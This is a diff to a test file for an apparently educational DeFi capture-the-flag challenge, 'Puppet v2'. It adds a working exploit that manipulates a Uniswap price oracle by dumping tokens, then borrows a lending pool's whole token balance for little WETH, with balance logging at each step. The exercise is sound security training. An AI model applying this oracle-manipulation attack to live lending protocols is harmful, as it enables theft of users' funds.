@@ -63,7 +63,7 @@ describe('[Challenge] Puppet v2', function () {
         this.lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
             this.weth.address,
             this.token.address,
-            this.uniswapExchange.address,
+            this.uniswapExchange.address, // UniswapV2Pair.sol
             this.uniswapFactory.address
         );
 
@@ -82,6 +82,50 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Connect as the attacker
+        this.token = this.token.connect(attacker);
+        this.weth = this.weth.connect(attacker);
+        this.uniswapExchange = this.uniswapExchange.connect(attacker);
+        this.lendingPool = this.lendingPool.connect(attacker);
+        this.uniswapRouter = this.uniswapRouter.connect(attacker);
+        this.uniswapFactory = this.uniswapFactory.connect(attacker);
+        this.exploit = await (await ethers.getContractFactory('Puppetv2Exploit', attacker)).deploy(this.uniswapRouter.address);
+
+        // Before Swap 
+        let [reserve_WETH, reserveTOKEN] = await this.lendingPool.getOracle();
+        console.log("Reserved ETH " + reserve_WETH / 1e18);
+        console.log("Reserved TOK " + reserveTOKEN / 1e18);
+
+        // attacker token & weth balance before swap
+        console.log("TOKEN " + await this.token.balanceOf(attacker.address));
+        console.log("WETH " + await this.weth.balanceOf(attacker.address) / 1e18);
+
+        // 1. Approve & swap DVT for WETH.
+        await this.token.approve(this.exploit.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.exploit.swap(this.token.address, this.weth.address, ATTACKER_INITIAL_TOKEN_BALANCE, 1,attacker.address);
+        
+        // attacker token & weth balance after swap
+        console.log("TOKEN " + await this.token.balanceOf(attacker.address));
+        console.log("WETH " + await this.weth.balanceOf(attacker.address) / 1e18);
+        
+        // reserves after swap
+        [reserve_WETH, reserveTOKEN] = await this.lendingPool.getOracle();
+        console.log("Reserved ETH " + reserve_WETH / 1e18);
+        console.log("Reserved TOK " + reserveTOKEN / 1e18);
+
+        // 2. Need more WETH. Deposit ETH for WETH.
+        await this.weth.deposit({ value: ethers.utils.parseEther('19.9')});
+        await this.weth.approve(this.lendingPool.address, ethers.utils.parseEther('29.9'));
+
+        // attacker weth after deposit
+        console.log("WETH " + await this.weth.balanceOf(attacker.address) / 1e18);
+
+        // 3. Borrow all TOKENS for WETH.
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // balances after exploit
+        console.log("TOKEN " + await this.token.balanceOf(attacker.address));
+        console.log("WETH " + await this.weth.balanceOf(attacker.address) / 1e18);
     });
 
     after(async function () {
